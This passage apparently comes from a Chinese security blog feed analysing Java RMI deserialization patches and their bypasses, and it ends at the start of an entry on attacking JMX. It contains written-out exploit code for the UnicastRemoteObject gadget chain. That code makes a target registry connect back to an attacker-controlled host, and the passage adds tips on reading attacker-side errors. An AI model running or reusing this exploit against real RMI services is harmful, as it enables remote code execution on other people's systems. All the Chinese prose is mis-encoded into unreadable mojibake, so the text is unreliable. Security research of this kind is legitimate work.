class="hljs-selector-class">.io</span>.ObjectInputStream#readObject<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬è§‚å¯Ÿä¿®å¤æ–¹æ¡ˆå¯ä»¥å‘ç°ï¼šå®˜æ–¹å¹¶æ²¡æœ‰å¤„ç†sun.rmi.server.UnicastRef#invokeä¹‹åçš„æ“ä½œï¼Œç›¸å½“äºsinkç‚¹æ²¡å˜ï¼Œç»•è¿‡è¡¥ä¸éœ€è¦æ‰¾ä¸€å¤„ååºåˆ—åŒ–çš„sourceç‚¹ï¼Œsourceç‚¹éœ€è¦æ»¡è¶³å¦‚ä¸‹æ¡ä»¶ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">1ã€ç™½åå•ä¸­çš„ç±»(å¯ç»•è¿‡JEP290)ï¼Œå¹¶ä¸”å­˜åœ¨readObject/readExternalæ–¹æ³•<br>2ã€readObject/readExternalæ–¹æ³•æœ€ç»ˆå¯ä»¥è§¦å‘UnicastRef<span class="hljs-comment">#invoke</span><br>3ã€å› ä¸ºRemoteObjectInvocationHandlerçš„ç‰¹ç‚¹ï¼š<br>  aã€å­˜åœ¨RemoteRefç±»å‹ï¼ˆUnicastRefçš„çˆ¶ç±»ï¼‰çš„å±æ€§ï¼ˆrefï¼‰<br>  bã€RemoteObjectInvocationHandler<span class="hljs-comment">#invokeä¼šè°ƒç”¨ref.invoke</span><br>  cã€RemoteObjectInvocationHandleræœ¬èº«å®ç°äº†InvocationHandlerï¼Œå¯ä½œä¸ºåŠ¨æ€ä»£ç†çš„å¤„ç†handlerï¼Œåœ¨è°ƒç”¨è¢«ä»£ç†æ¥å£æ–¹æ³•æ—¶ä¼šå…ˆè°ƒç”¨RemoteObjectInvocationHandler<span class="hljs-comment">#invoke</span><br>æ‰€ä»¥æ¡ä»¶2å°±å˜æˆäº†ï¼šååºåˆ—åŒ–æ–¹æ³•ä¸­æœ€ç»ˆå¯ä»¥è§¦å‘å…¶å±æ€§çš„æ–¹æ³•ï¼Œå±æ€§æ¥å£ä½¿ç”¨RemoteObjectInvocationHandlerä»£ç†å³å¯<br></code></pre></td></tr></table></figure><p>é¡ºç€è¿™ä¸ªæ€è·¯ï¼Œæ‰¾åˆ°JEP290çš„ç™½åå•ä¸­æœ‰ä¸ªjava.rmi.server.UnicastRemoteObjectï¼Œè¿™ä¸ªç±»çš„readObject()æ–¹æ³•æœ€ç»ˆä¼šè°ƒç”¨åˆ°å…¶å±æ€§å€¼ssfçš„createServerSocketæ–¹æ³•</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/42.png"></p><p>è¿™é‡Œç”¨åˆ°äº†åŠ¨æ€ä»£ç†çš„ç‰¹æ€§ï¼šå½“è°ƒç”¨ssfå±æ€§çš„createServerSocketæ–¹æ³•æ—¶ï¼Œä¼šè°ƒç”¨handler.invoke()ï¼Œå³è¿™é‡Œä¼šè°ƒç”¨RemoteObjectInvocationHandler#invoke</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/43.png"></p><p>è€ŒRemoteObjectInvocationHandlerçš„refå±æ€§ä¸ºæˆ‘ä»¬æ„é€ çš„UnicastRefå¯¹è±¡ï¼Œæ‰€ä»¥ä¼šè°ƒç”¨åˆ°sun.rmi.server.UnicastRef#invoke(java.rmi.Remote, java.lang.reflect.Method, java.lang.Object[], long)ï¼Œæ¥ä¸‹æ¥å°±ä¸UnicastRefé“¾ä¸€è‡´äº†</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/44.png"></p><p>æœ€ç»ˆçš„è°ƒç”¨é“¾ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stylus">UnicastRemoteObject gadget chainï¼š<br>java<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.server</span>.UnicastRemoteObject<span class="hljs-selector-id">#readObject</span><br>java<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.server</span>.UnicastRemoteObject<span class="hljs-selector-id">#reexport</span><br>java<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.server</span>.UnicastRemoteObject<span class="hljs-selector-id">#exportObject</span><br>...<br>            sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span><span class="hljs-selector-class">.tcp</span>.TCPTransport<span class="hljs-selector-id">#listen</span><br>                sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span><span class="hljs-selector-class">.tcp</span>.TCPEndpoint<span class="hljs-selector-id">#newServerSocket</span><br>                com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.proxy</span>.<span class="hljs-variable">$Proxy1</span><span class="hljs-selector-class">.createServerSocket</span>()<br>                    java<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.server</span>.RemoteObjectInvocationHandler<span class="hljs-selector-id">#invoke</span><br>                        java<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.server</span>.RemoteObjectInvocationHandler<span class="hljs-selector-id">#invokeRemoteMethod</span><br>                        sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.server</span>.UnicastRef<span class="hljs-selector-id">#invoke</span><br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span>.StreamRemoteCall<span class="hljs-selector-id">#executeCall</span><br>java<span class="hljs-selector-class">.io</span>.ObjectInputStream#readObject<br></code></pre></td></tr></table></figure><p>ç¼–å†™expï¼š</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">gen<span class="hljs-constructor">UnicastRef()</span>ä¸ºç”ŸæˆUnicastRefå¯¹è±¡çš„æ–¹æ³•<br>lookup<span class="hljs-literal">()</span>ä¸ºæˆ‘ä»¬é‡å†™çš„æ–¹æ³•ï¼Œå¯ä»¥ä¼ å…¥Objectç±»å‹<br><br>Registry registry = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LocateRegistry</span>.</span></span>get<span class="hljs-constructor">Registry(<span class="hljs-string">&quot;192.168.232.8&quot;</span>, 1099)</span>;<br>RemoteObjectInvocationHandler remoteObjectInvocationHandler = <span class="hljs-keyword">new</span> <span class="hljs-constructor">RemoteObjectInvocationHandler(<span class="hljs-params">genUnicastRef</span>(<span class="hljs-string">&quot;192.168.232.1&quot;</span>,2233)</span>);<br>RMIServerSocketFactory rmiServerSocketFactory = (RMIServerSocketFactory) <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Proxy</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">ProxyInstance(RMIServerSocketFactory.<span class="hljs-params">class</span>.<span class="hljs-params">getClassLoader</span>()</span>, <span class="hljs-keyword">new</span> Class<span class="hljs-literal">[]</span>&#123;<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">RMIServerSocketFactory</span>.</span></span><span class="hljs-keyword">class</span>,<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Remote</span>.</span></span><span class="hljs-keyword">class</span>&#125;, remoteObjectInvocationHandler);<br>Constructor constructor = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">UnicastRemoteObject</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">DeclaredConstructor(<span class="hljs-params">null</span>)</span>;<br>constructor.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;<br>UnicastRemoteObject unicastRemoteObject = (UnicastRemoteObject) constructor.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(<span class="hljs-params">null</span>)</span>;<br>Field ssf = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">UnicastRemoteObject</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;ssf&quot;</span>)</span>;<br>ssf.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;<br>ssf.set(unicastRemoteObject, rmiServerSocketFactory);<br>lookup(registry, unicastRemoteObject);<br></code></pre></td></tr></table></figure><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/45.png"></p><p>ä½¿ç”¨UnicastRefRemoteObjecté“¾ç»•è¿‡å®˜æ–¹å¯¹äºUnicastRefé“¾çš„ä¿®å¤</p><h3 id="5ã€jdk-x3D-8u241"><a href="#5ã€jdk-x3D-8u241" class="headerlink" title="5ã€jdk &#x3D; 8u241"></a>5ã€jdk &#x3D; 8u241</h3><h4 id="5-1-ä¿®å¤1ï¼šRMI-ä¿®å¤UnicastRefRemoteObjecté“¾ç»•è¿‡çš„é—®é¢˜"><a href="#5-1-ä¿®å¤1ï¼šRMI-ä¿®å¤UnicastRefRemoteObjecté“¾ç»•è¿‡çš„é—®é¢˜" class="headerlink" title="5.1 ä¿®å¤1ï¼šRMI ä¿®å¤UnicastRefRemoteObjecté“¾ç»•è¿‡çš„é—®é¢˜"></a>5.1 ä¿®å¤1ï¼šRMI ä¿®å¤UnicastRefRemoteObjecté“¾ç»•è¿‡çš„é—®é¢˜</h4><p>åœ¨jdk8u241å¯¹UnicastRefRemoteObjecté“¾çš„åˆ©ç”¨åšäº†ä¿®å¤ï¼Œæœ‰ä¸¤å¤„ï¼š</p><p>1ã€sun.rmi.registry.RegistryImpl_Skelçš„bindã€lookupã€unbindä¼ è¾“çš„Stringç±»å‹å‚æ•°ä½¿ç”¨readObject(String.class)è¿›è¡Œååºåˆ—åŒ–æ“ä½œ</p><p>2ã€java.rmi.server.RemoteObjectInvocationHandler#invokeRemoteMethod åœ¨è°ƒç”¨ref.invokeå‰æ£€æµ‹Methodå¯¹è±¡è¡¨ç¤ºæ–¹æ³•æ‰€åœ¨ç±»çš„Classå¯¹è±¡ï¼ˆå³è¿™é‡ŒGadget chainä¸­çš„RMIServerSocketFactoryï¼‰æ˜¯å¦å®ç°äº†Remoteæ¥å£</p><p>è¿™ä¸¤å¤„è¡¥ä¸é’ˆå¯¹æ€§ä¿®å¤äº†UnicastRefRemoteObjecté“¾ï¼Œå…·ä½“å¦‚ä¸‹</p><p>sun.rmi.registry.RegistryImpl_Skel#lookup</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/46.png"></p><p>java.rmi.server.RemoteObjectInvocationHandler#invokeRemoteMethod</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/47.png"></p><p>var2 æ˜¯è°ƒç”¨æ ˆä¸­è§¦å‘ä»£ç†handlerçš„æ–¹æ³•ï¼ˆcreateServerSocketï¼‰ï¼Œ æˆ‘ä»¬æ— æ³•æ§åˆ¶æ­¤å‚æ•°ï¼ŒGadgetä¸­çš„å…³é”®ç±»RMIServerSocketFactoryæ²¡æœ‰å®ç°Remoteæ¥å£å¯¼è‡´ååºåˆ—åŒ–ä¸­æ–­å¤±è´¥ã€‚ä¿®å¤çš„è°ƒç”¨æ ˆå¦‚ä¸‹ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stylus">UnicastRemoteObject gadget chainï¼š<br>java<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.server</span>.UnicastRemoteObject<span class="hljs-selector-id">#readObject</span><br>java<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.server</span>.UnicastRemoteObject<span class="hljs-selector-id">#reexport</span><br>java<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.server</span>.UnicastRemoteObject<span class="hljs-selector-id">#exportObject</span><br>...<br>            sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span><span class="hljs-selector-class">.tcp</span>.TCPTransport<span class="hljs-selector-id">#listen</span><br>                sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span><span class="hljs-selector-class">.tcp</span>.TCPEndpoint<span class="hljs-selector-id">#newServerSocket</span><br>                com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.proxy</span>.<span class="hljs-variable">$Proxy1</span><span class="hljs-selector-class">.createServerSocket</span>()<br>                    java<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.server</span>.RemoteObjectInvocationHandler<span class="hljs-selector-id">#invoke</span><br>                        java<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.server</span>.RemoteObjectInvocationHandler<span class="hljs-selector-id">#invokeRemoteMethod</span><span class="hljs-comment">//ä¿®å¤2</span><br>                        sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.server</span>.UnicastRef<span class="hljs-selector-id">#invoke</span><br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span>.StreamRemoteCall<span class="hljs-selector-id">#executeCall</span><br>java<span class="hljs-selector-class">.io</span>.ObjectInputStream#readObject<br></code></pre></td></tr></table></figure><h3 id="6ã€jdk-â‰¥-8u241-çš„åˆ©ç”¨æ–¹å¼â€”åº”ç”¨å±‚ååºåˆ—åŒ–é—®é¢˜"><a href="#6ã€jdk-â‰¥-8u241-çš„åˆ©ç”¨æ–¹å¼â€”åº”ç”¨å±‚ååºåˆ—åŒ–é—®é¢˜" class="headerlink" title="6ã€jdk â‰¥ 8u241 çš„åˆ©ç”¨æ–¹å¼â€”åº”ç”¨å±‚ååºåˆ—åŒ–é—®é¢˜"></a>6ã€jdk â‰¥ 8u241 çš„åˆ©ç”¨æ–¹å¼â€”åº”ç”¨å±‚ååºåˆ—åŒ–é—®é¢˜</h3><blockquote><p>ç›®å‰å¦‚æœç›®æ ‡çš„JDKç‰ˆæœ¬å¤§äºæˆ–ç­‰äº8u241ï¼Œæš‚æ— æ³•åˆ©ç”¨å†…ç½®æ–¹æ³•å®Œæˆæ”»å‡»ã€‚ä½†æ˜¯è¿˜å¯ä»¥å¯»æ‰¾åº”ç”¨ç¨‹åºçº§åˆ«çš„æ–¹æ³•ï¼Œå½“ä¼ é€’çš„æ˜¯Objectã€Remoteã€Mapç­‰ç±»å‹å‚æ•°æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å…¶ä¼ é€’æ„é€ çš„æ¶æ„å¯¹è±¡è¿›è¡Œåˆ©ç”¨ã€‚</p></blockquote><p>åœ¨3.2ç« èŠ‚æˆ‘ä»¬åˆ©ç”¨â€œè°ƒç”¨è‡ªå®šä¹‰æ–¹æ³•â€çš„é€»è¾‘å»è°ƒç”¨äº†å†…ç½®çš„bindæ–¹æ³•ï¼Œç³»ç»Ÿåœ¨å¤„ç†å‚æ•°æ—¶ä½¿ç”¨ååºåˆ—åŒ–æ“ä½œæ— è¿‡æ»¤å¯¼è‡´å‡ºç°é—®é¢˜ã€‚è¿™é‡Œåˆ©ç”¨çš„ä¹Ÿæ˜¯è¿™ä¸ªåŸç†ï¼Œå½“å®¢æˆ·ç«¯è°ƒç”¨æœåŠ¡ç«¯è‡ªå®šä¹‰æ–¹æ³•æ—¶ï¼ŒæœåŠ¡ç«¯æ ¹æ®<code>hashToMethod_Map.get(æ–¹æ³•hashå€¼)</code>ç¡®è®¤ç›®æ ‡æ–¹æ³•ã€unmarshalParametersè§£æå‚æ•°ã€æœ€åinvokeåå°„è°ƒç”¨<img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/48.png"></p><p>åœ¨sun.rmi.server.UnicastServerRef#unmarshalParametersUncheckedæ–¹æ³•ä¸­å¯¹æ¯ä¸ªå‚æ•°ä¾æ¬¡è§£æ</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/49.png"></p><p>sun.rmi.server.UnicastRef#unmarshalValue å½“å‚æ•°ç±»å‹éåŸºæœ¬æ•°æ®ç±»å‹ã€éStringç±»å‹æ—¶ç›´æ¥è°ƒç”¨readObject</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/50.png"></p><h3 id="7ã€é”™è¯¯æ’æŸ¥"><a href="#7ã€é”™è¯¯æ’æŸ¥" class="headerlink" title="7ã€é”™è¯¯æ’æŸ¥"></a>7ã€é”™è¯¯æ’æŸ¥</h3><p>åœ¨æ¼æ´åˆ©ç”¨è¿‡ç¨‹ä¸­ä¼šå‡ºç°å„ç§æŠ¥é”™ï¼Œæœ¬èŠ‚åˆ†æå„ç§æŠ¥é”™å‡ºç°åŸå› åŠå¯¹åº”è§£å†³ç»•è¿‡æ–¹æ¡ˆ</p><h4 id="7-1-ObjectInputFilter-REJECTED"><a href="#7-1-ObjectInputFilter-REJECTED" class="headerlink" title="7.1  ObjectInputFilter REJECTED"></a>7.1  ObjectInputFilter REJECTED</h4><p>å½“ä½¿ç”¨Ysoserialçš„ysoserial.exploit.RMIRegistryExploitç»“åˆCommonsCollections6åˆ©ç”¨é“¾æ”»å‡»ç›®æ ‡RMIæœåŠ¡å™¨æ—¶å‡ºç°è¯¥æŠ¥é”™</p><p>ç›®æ ‡RMIæœåŠ¡æ—¥å¿—ä¿¡æ¯ï¼š</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">ObjectInputFilter REJECTED: class sun.reflect.annotation.AnnotationInvocationHandler, array length: -1, nRefs: 6, depth: 2, bytes: 298, ex: n/a<br></code></pre></td></tr></table></figure><p>æ”»å‡»è€…æ—¥å¿—ä¿¡æ¯ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">java<span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.InvalidClassException</span>: <span class="hljs-attribute">filter</span> status: REJECTED<br></code></pre></td></tr></table></figure><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/51.png"></p><p>è¿™ç§æƒ…å†µä¸‹æ˜¯æœ¬æ–‡2.1é™åˆ¶1ä¸­æåˆ°çš„JEP290ç”Ÿæ•ˆï¼Œç”¨äºåŒ…è£…CommonsCollections6çš„AnnotationInvocationHandlerä¸åœ¨JEP290çš„ç™½åå•ä¸­å¯¼è‡´æ¼æ´åˆ©ç”¨å¤±è´¥ã€‚åˆ©ç”¨UnicastRefé“¾ç»•è¿‡å³å¯</p><h4 id="7-2-Registry-Registry-bind-disallowed"><a href="#7-2-Registry-Registry-bind-disallowed" class="headerlink" title="7.2 Registry.Registry.bind disallowed"></a>7.2 Registry.Registry.bind disallowed</h4><p>å½“ä½¿ç”¨ç»•è¿‡JEP290çš„UnicastRefé“¾ç»“åˆRMIConnectionImpl_Stubç±»æ”»å‡»ç›®æ ‡RMIæœåŠ¡å™¨æ—¶å‡ºç°è¯¥æŠ¥é”™</p><p>æ”»å‡»è€…æ—¥å¿—ä¿¡æ¯ï¼š</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">java.rmi.AccessException: Registry.Registry.bind disallowed; <span class="hljs-built_in">origin</span> /<span class="hljs-number">192.168</span><span class="hljs-number">.232</span><span class="hljs-number">.1</span> <span class="hljs-built_in">is</span> non-<span class="hljs-built_in">local</span> host<br></code></pre></td></tr></table></figure><p>ç›®æ ‡ç¯å¢ƒä¸ºJDK8u121</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/52.png"></p><p>ç›®æ ‡ç¯å¢ƒä¸ºJDK8u141</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/53.png"></p><p>ä»”ç»†æŸ¥çœ‹å‘ç°è™½ç„¶æŠ¥é”™éƒ½æ˜¯Registry.Registry.bind disallowedï¼Œä½†æ˜¯å‰è€…åˆ©ç”¨æˆåŠŸï¼Œåè€…å´å¤±è´¥äº†ã€‚141çš„è°ƒç”¨æ ˆå¹¶æ²¡æœ‰æ‰§è¡Œåˆ°RegistryImpl.bindã€‚è¯¥ç§æƒ…å†µä¸æœ¬æ–‡3.1ç« èŠ‚ä¸­åˆ†æçš„ä¸€è‡´ï¼ŒOracleå®˜æ–¹å°†checkAccessåœ°å€æ£€æŸ¥ä»RegistryImpl.bindæå‰åˆ°äº†RegistryImpl_Skel.dispatchï¼Œå¯¼è‡´æ¼æ´åˆ©ç”¨å¤±è´¥ã€‚æ‰€ä»¥æˆ‘ä»¬æ ¹æ®æŠ¥é”™å¯ä»¥æ¨æ–­å‡ºåˆ©ç”¨æƒ…å†µï¼šå¦‚æœè°ƒç”¨æ ˆæ‰§è¡Œåˆ°äº†RegistryImpl.bindå†æŠ¥é”™ï¼Œè¯´æ˜æ¼æ´åˆ©ç”¨å·²ç»å®Œæˆï¼Œåä¹‹åˆ™è¯´æ˜ç›®æ ‡JDKç‰ˆæœ¬å¤§äºç­‰äº8u141ï¼Œéœ€è¦ä½¿ç”¨æˆ‘ä»¬æ”¹é€ çš„lookupè¿›è¡Œåˆ©ç”¨</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/54.png"></p><h4 id="7-3-java-lang-ClassCastException-xxx-cannot-be-cast-to-java-lang-String"><a href="#7-3-java-lang-ClassCastException-xxx-cannot-be-cast-to-java-lang-String" class="headerlink" title="7.3 java.lang.ClassCastException: xxx cannot be cast to java.lang.String"></a>7.3 java.lang.ClassCastException: xxx cannot be cast to java.lang.String</h4><p>å½“ä½¿ç”¨ç»•è¿‡JEP290â€”localé™åˆ¶çš„UnicastRefé“¾ç»“åˆRMIConnectionImpl_Stubç±»ã€æ”¹é€ çš„lookup()æ”»å‡»ç›®æ ‡RMIæœåŠ¡å™¨ï¼Œæ•ˆæœåŠæŠ¥é”™å¦‚ä¸Šå›¾ã€‚è™½ç„¶æŠ¥ç±»å‹è½¬æ¢é”™è¯¯ï¼Œä½†æ˜¯æ¼æ´å·²ç»åˆ©ç”¨å®Œæˆ</p><h4 id="7-4-Cannot-cast-an-object-to-java-lang-String"><a href="#7-4-Cannot-cast-an-object-to-java-lang-String" class="headerlink" title="7.4 Cannot cast an object to java.lang.String"></a>7.4 Cannot cast an object to java.lang.String</h4><p>å½“ä½¿ç”¨UnicastRemoteObjecté“¾ç»“åˆæ”¹é€ çš„lookup()æ”»å‡»åŸºäºJDK8u241çš„ç›®æ ‡RMIæœåŠ¡å™¨æ—¶å‡ºç°è¯¥æŠ¥é”™</p><p>æ”»å‡»è€…æ—¥å¿—ä¿¡æ¯ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.ClassCastException</span>: Cannot cast an <span class="hljs-selector-tag">object</span> to java<span class="hljs-selector-class">.lang</span>.String<br></code></pre></td></tr></table></figure><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/55.png"></p><p>è¿™ç§æƒ…å†µæ˜¯æœ¬ç« 5.1æåˆ°çš„Oracleå®˜æ–¹åœ¨JDK8u241ç”¨äºä¿®å¤UnicastRefRemoteObjecté“¾çš„è¡¥ä¸ï¼Œæœ€ç»ˆåœ¨ååºåˆ—åŒ–æ—¶æŠ¥é”™java.io.ObjectInputStream#readObject0</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/56.png"></p><p>è¿™ç§æƒ…å†µä¸‹è¯´æ˜ç›®æ ‡çš„JDKç‰ˆæœ¬é«˜äºæˆ–ç­‰äº8u241ç‰ˆæœ¬ï¼Œç›®å‰åªèƒ½ä½¿ç”¨åº”ç”¨å±‚çš„æ–¹æ³•è¿›è¡Œåˆ©ç”¨äº†</p><h2 id="3ã€æ€»ç»“"><a href="#3ã€æ€»ç»“" class="headerlink" title="3ã€æ€»ç»“"></a>3ã€æ€»ç»“</h2><p>æœ¬æ–‡åŸºäºOracleå®˜æ–¹å¯¹äºRMIåˆ©ç”¨çš„ä¿®å¤å†å²ï¼Œä¾æ¬¡åˆ†æäº†JDK8u121çš„JEP290ä¿®å¤ç»•è¿‡ã€JDK8u141çš„æ¥æºé™åˆ¶ã€JDK8u231å¯¹äºUnicastRefé“¾çš„ä¿®å¤ã€JDK8u241å¯¹äºUnicastRefRemoteObjecté“¾çš„ä¿®å¤åŠå„è¡¥ä¸çš„ç»•è¿‡æƒ…å†µã€‚è¿™éƒ¨åˆ†çŸ¥è¯†ç½‘ä¸Šèµ„æ–™å¾ˆå¤šï¼Œä½†å¤§å¤šæ˜¯åˆ†æå•ä¸ªç‰ˆæœ¬çš„åˆ©ç”¨æ‰‹æ³•ã€ä¿®å¤åŠç»•è¿‡ã€‚è‡ªå·±çœ‹äº†ä¸€åœˆåï¼Œæ„Ÿè§‰è¿˜æ˜¯æ‡µæ‡‚ï¼Œæ·±çŸ¥è‡ªå·±å¯¹äºè¿™éƒ¨åˆ†å†…å®¹çš„å‚¨å¤‡åŠç†è§£ä¸å¤Ÿï¼Œé‚èŠ±äº†äº¿ç‚¹æ—¶é—´æ•´ç†æ­¤ä¸‡å­—é•¿æ–‡ã€‚ä¹Ÿå¸Œæœ›å¯¹å„ä½å­¦ä¹ è¿™éƒ¨åˆ†çŸ¥è¯†çš„å¸ˆå‚…æœ‰å¸®åŠ©ã€‚</p><h2 id="4ã€å‚è€ƒ"><a href="#4ã€å‚è€ƒ" class="headerlink" title="4ã€å‚è€ƒ"></a>4ã€å‚è€ƒ</h2><p><a href="https://i.blackhat.com/eu-19/Wednesday/eu-19-An-Far-Sides-Of-Java-Remote-Protocols.pdf">https://i.blackhat.com/eu-19/Wednesday/eu-19-An-Far-Sides-Of-Java-Remote-Protocols.pdf</a><br><a href="https://su18.org/post/rmi-attack/">https://su18.org/post/rmi-attack/</a><br><a href="https://mogwailabs.de/en/blog/2019/03/attacking-java-rmi-services-after-jep-290/">https://mogwailabs.de/en/blog/2019/03/attacking-java-rmi-services-after-jep-290/</a><br><a href="https://www.anquanke.com/post/id/197829">https://www.anquanke.com/post/id/197829</a><br><a href="http://code2sec.com/cve-2017-3241-java-rmi-registrybindfan-xu-lie-hua-lou-dong.html">http://code2sec.com/cve-2017-3241-java-rmi-registrybindfan-xu-lie-hua-lou-dong.html</a><br><a href="https://xz.aliyun.com/t/7932">https://xz.aliyun.com/t/7932</a></p>]]></content>
    
    
    <categories>
      
      <category>ä»£ç å®¡è®¡</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaSec</tag>
      
      <tag>RMI</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Attack JMX Serviceçš„æ‰“å¼€æ–¹å¼</title>
    <link href="/2022/How-to-attack-RMI-based-JMX-services/"/>
    <url>/2022/How-to-attack-RMI-based-JMX-services/</url>
    
    <content type="html"><![CDATA[<p>æœ‰æ¬¡æ¼æ´æŒ–æ˜é¡¹ç›®ä¸­ç¢°åˆ°äº†æœªæˆæƒJMXçš„æƒ…å†µï¼Œåœ¨å¤ç›˜æ—¶å‘ç°å¯¹äºæ•´å¥—æ”»å‡»JMXæœåŠ¡çš„æ–¹å¼ä¸å¤ªäº†è§£ã€‚è¶ç€æœ€è¿‘æœ‰æ—¶é—´ å¯¹JMXç›¸å…³çŸ¥è¯†æ¥æ¬¡è¡¥å……ï¼Œé‚å†™äº†æ­¤æ–‡ã€‚ä¸»è¦å¯¹JMXæœåŠ¡æœªé‰´æƒæ—¶çš„åˆ©ç”¨æ–¹å¼ã€JMXå„è´¦æˆ·æƒé™å¯å¯¹åº”æ‰§è¡Œçš„æ“ä½œã€Oracleå®˜æ–¹å¯¹äºæ¼æ´çš„ä¿®å¤ã€é‰´æƒåçš„æ”»å‡»åˆ©ç”¨æ–¹å¼åšäº†åˆ†ææ¼”ç¤ºã€‚åœ¨æ¢³ç†å®Œæ­¤æ–‡ååŸºæœ¬ä¸Šå¯¹æ”»å‡»JMXæœåŠ¡æœ‰åº•äº†ï¼Œä¹ŸæˆåŠŸåˆ©ç”¨è¿™äº›ç‰¹æ€§PWNæ‰äº†***äº§å“ï¼Œä¸­é—´çš„è¿‡ç¨‹ä¹Ÿæ¯”è¾ƒæœ‰è¶£ï¼Œç­‰æœ‰æœºä¼šå†åšåˆ†äº«â€¦</p><h2 id="1ã€åŸºç¡€çŸ¥è¯†"><a href="#1ã€åŸºç¡€çŸ¥è¯†" class="headerlink" title="1ã€åŸºç¡€çŸ¥è¯†"></a>1ã€åŸºç¡€çŸ¥è¯†</h2><p>JMXæ˜¯JAVA1.5å¼•å…¥çš„æ–°ç‰¹æ€§ï¼Œå…¨ç§°ä¸ºJava Management 